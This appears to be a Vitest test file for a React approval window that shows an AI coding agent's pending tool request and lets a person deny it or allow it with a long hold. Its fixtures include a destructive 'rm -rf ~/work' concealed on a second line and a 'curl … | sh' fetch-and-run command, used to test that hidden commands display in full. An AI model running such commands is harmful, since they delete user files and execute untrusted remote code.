// @vitest-environment happy-dom
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import AgentPrompt from "@/agent-prompt/prompt";
import { HOLD_MS } from "@/components/hold-button";
import type { AgentRequest } from "@/lib/agent-requests";

// The agent prompt window (pinned layer P8): everything the tool would get shows exactly, Deny is a tap, Allow is a full
// hold from a finger or the keyboard, an early lift answers nothing, nothing answers by itself when the wait runs out, and an
// answer only ever goes to the request that was on screen when it was given.

/** A command whose second line and run of spaces a single-line box would hide. */
const TRICKY = "echo harmless\nrm -rf ~/work      # the rest";
/** Bash's input as ips-server's `request_text` sends it: the command first, then every other field. */
const TEXT = `${TRICKY}\n\ndescription: List the files\n\ntimeout: 120000`;
const REQUEST: AgentRequest = { id: "r1", agent: "claude", session: "abc", project: "InfoPanel.Studio", tool: "Bash", text: TEXT, until: 25_000 };
const OTHER: AgentRequest = { ...REQUEST, id: "r2", text: "curl https://example.invalid | sh" };

let answer: ReturnType<typeof vi.fn<(id: string, behavior: string) => Promise<boolean>>>;

beforeEach(() => {
  vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout", "setInterval", "clearInterval", "requestAnimationFrame", "cancelAnimationFrame", "performance", "Date"] });
  vi.setSystemTime(0);
  answer = vi.fn(async () => true);
});

afterEach(() => {
  cleanup();
  vi.useRealTimers();
});

const box = () => screen.getByRole("textbox", { name: "What it would run, in full" }) as HTMLTextAreaElement;

describe("the agent prompt", () => {
  it("shows every field exactly: newlines and runs of spaces kept, lines never wrapped or cut", () => {
    render(<AgentPrompt requests={[REQUEST]} answer={answer} />);
    expect(screen.getByRole("status").textContent).toBe("Claude Code wants to run a command");
    expect(box().value).toBe(TEXT);
    expect(box().getAttribute("wrap")).toBe("off");
    expect(box().className).toContain("whitespace-pre");
    expect(box().className).toContain("overflow-auto");
    expect(screen.getByText("Answer here for 25 s, then in the terminal.")).toBeTruthy();
  });

  it("denies on a tap of Deny", async () => {
    render(<AgentPrompt requests={[REQUEST]} answer={answer} />);
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "Deny" }));
    });
    expect(answer.mock.calls).toEqual([["r1", "deny"]]);
  });

  it("allows only after a full hold, from a finger or the keyboard", async () => {
    render(<AgentPrompt requests={[REQUEST]} answer={answer} />);
    const hold = screen.getByRole("button", { name: /^Hold to allow/ });
    fireEvent.pointerDown(hold);
    act(() => vi.advanceTimersByTime(HOLD_MS / 2));
    fireEvent.pointerUp(hold);
    act(() => vi.advanceTimersByTime(HOLD_MS));
    expect(answer).not.toHaveBeenCalled();
    fireEvent.keyDown(hold, { key: "Enter" });
    await act(async () => {
      vi.advanceTimersByTime(HOLD_MS + 50);
    });
    expect(answer.mock.calls).toEqual([["r1", "allow"]]);
  });

  it("answers nothing when another request takes the screen during a hold", async () => {
    const { rerender } = render(<AgentPrompt requests={[REQUEST]} answer={answer} />);
    fireEvent.pointerDown(screen.getByRole("button", { name: /^Hold to allow/ }));
    act(() => vi.advanceTimersByTime(HOLD_MS / 2));
    // r1 went back to the terminal and r2 arrived under the finger
    rerender(<AgentPrompt requests={[OTHER]} answer={answer} />);
    await act(async () => {
      vi.advanceTimersByTime(HOLD_MS * 2);
    });
    expect(answer).not.toHaveBeenCalled();
    expect(box().value).toBe(OTHER.text);
  });

  it("answers the request it showed, never one that arrived since", async () => {
    let settle: (ok: boolean) => void = () => {};
    answer.mockImplementationOnce(() => new Promise((r) => (settle = r)));
    const { rerender } = render(<AgentPrompt requests={[REQUEST, OTHER]} answer={answer} />);
    expect(screen.getByText(/1 more waiting/)).toBeTruthy();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "Deny" }));
    });
    rerender(<AgentPrompt requests={[OTHER]} answer={answer} />);
    await act(async () => settle(true));
    expect(answer.mock.calls).toEqual([["r1", "deny"]]);
  });

  it("counts down, and when the wait is over sends you to the terminal without answering", () => {
    render(<AgentPrompt requests={[REQUEST]} answer={answer} />);
    act(() => vi.advanceTimersByTime(7_000));
    expect(screen.getByText("Answer here for 18 s, then in the terminal.")).toBeTruthy();
    act(() => vi.advanceTimersByTime(20_000));
    expect(screen.getByText("Answer in the terminal.")).toBeTruthy();
    expect(answer).not.toHaveBeenCalled();
  });

  it("names a tool that isn't a shell, and shows nothing with no request", () => {
    const { container, rerender } = render(<AgentPrompt requests={[{ ...REQUEST, agent: "codex", tool: "apply_patch", text: "src/a.ts" }]} answer={answer} />);
    expect(screen.getByRole("status").textContent).toBe("Codex wants to use apply_patch");
    rerender(<AgentPrompt requests={[]} answer={answer} />);
    expect(container.innerHTML).toBe("");
  });
});
